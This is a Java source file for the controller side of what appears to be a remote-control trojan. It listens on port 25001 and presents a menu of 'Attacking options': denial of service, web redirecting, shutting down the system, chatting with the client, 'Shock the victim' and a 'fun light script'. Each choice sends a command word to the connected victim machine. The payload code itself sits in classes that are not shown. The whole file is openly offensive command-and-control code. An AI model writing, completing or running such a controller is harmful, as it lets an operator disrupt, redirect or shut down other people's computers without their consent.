import java.net.*;
import java.util.*;

import javax.swing.JFrame;
import javax.swing.JOptionPane;

import java.io.*;
public class Server {
	static int port = 25001;
	static ServerSocket ss;
	static Socket s;
	static DataInputStream din;
	static DataOutputStream dout;
	static BufferedReader br;
	static String send="",recive="";
	static Scanner in = new Scanner(System.in);
	AttackOperation ao = new AttackOperation();
	public void openConnection(){
		
		JFrame j=new JFrame();
		j.setAlwaysOnTop(true);
		j.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		j.setVisible(true);
		j.setVisible(false);
		
		try{
			ss = new ServerSocket(port);
			s = ss.accept();
			System.out.println("Connection established with client at port :"+port);
			
			int option=optionForAttacking(j);
			
			din = new DataInputStream(s.getInputStream());
			dout = new DataOutputStream(s.getOutputStream());
			br = new BufferedReader(new InputStreamReader(System.in));
			
			while(option<7){
				
				if(option == 1){
					dout.writeUTF("dos");
					recive = din.readUTF();
					System.out.println(recive);
				}
				
				if(option== 2){
					ao.webAttack(j,din,dout);
				}
				
				if(option == 3){
					dout.writeUTF("shut");
					recive = din.readUTF();
					System.out.println(recive);
				}
				
				if(option == 4){
					try{
						//chat 
						dout.writeUTF("chat");
						recive = din.readUTF();
						while(!send.equals("stop") || !recive.equals("stop")){
							String temp = "client :";
							temp+=recive;
							send = JOptionPane.showInputDialog(j,temp);
							dout.writeUTF(send);
							recive = din.readUTF();
						}
						
						recive = din.readUTF();
						System.out.println("chat ended ..!..");
					}
					catch (Exception e){
						System.out.println("chat ended !");
					}
				}
				
				if(option == 5){
					dout.writeUTF("shock");
					recive = din.readUTF();
					System.out.println(recive);
				}
				
				if(option == 6){
					dout.writeUTF("light");
					recive = din.readUTF();
					System.out.println(recive);
				}
					
					
				
				option = optionForAttacking(j);
			}
			
			s.close();
			ss.close();

			
		}
		catch(Exception e){
			System.out.println("Error accured in connection..");
			System.out.println(e.getMessage());
		}
	}
	
	public static int optionForAttacking(JFrame j) throws IOException{
		
		String option="";
		String options = "\nAttacking options:\n1: Dos Attack\n2: Web redirecting\n3: Shutdown the system\n4: chat with client\n5: Shock the victim\n6: Fun light script\nEnter your choise:\n";
		option = JOptionPane.showInputDialog(j,options);
		return Integer.parseInt(option);
	}
	

	
	
	

}
